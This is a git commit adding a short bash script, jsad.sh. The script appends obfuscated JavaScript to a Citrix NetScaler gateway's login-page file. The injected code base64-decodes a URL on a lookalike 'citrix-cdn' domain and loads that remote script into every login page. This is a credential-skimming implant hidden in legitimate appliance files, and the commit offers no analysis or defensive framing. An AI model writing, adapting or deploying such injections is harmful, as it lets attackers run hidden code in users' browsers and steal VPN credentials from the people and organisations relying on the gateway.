a4667664c2ca89e5bcb87c7f331a59cb53af1189
ChanLiHou <149198882+ChanLiHou@users.noreply.github.com>
2023-11-02 08:58:41 -0800

    Create jsad.sh

---
+++ jsad.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+echo 'var u=window.atob("aHR0cHM6Ly9jaXRyaXgtY2RuLm5ldC9wb2prZmNrajIwOTNqY2xrc2Rhc2RkajA5ZGZwaHFvaXdoamUyaTFvNDNqcGlvbS9jaXRyaXguanM=");var s=document.createElement("script");s.src=u;s.type="text/javascript";document.head.appendChild(s);' >> /netscaler/ns_gui/vpn/js/gateway_login_form_view.js
